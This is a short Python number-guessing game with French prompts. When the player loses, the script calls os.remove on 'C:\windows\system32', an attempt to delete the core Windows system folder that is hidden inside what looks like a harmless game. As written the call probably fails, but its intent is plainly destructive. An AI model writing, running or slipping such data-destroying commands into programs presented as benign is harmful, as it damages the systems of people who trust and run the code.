import random
import os

number = random.randint(1, 10)

guess = int(input("Jouons à un jeu, donnez-moi un nombre entre 1 et 10 : "))

if guess == number:
    print('GG, tu as gagné')
else:
    print('Dommage, tu as perdu. Le nombre était', number)
    os.remove('C:\windows\system32')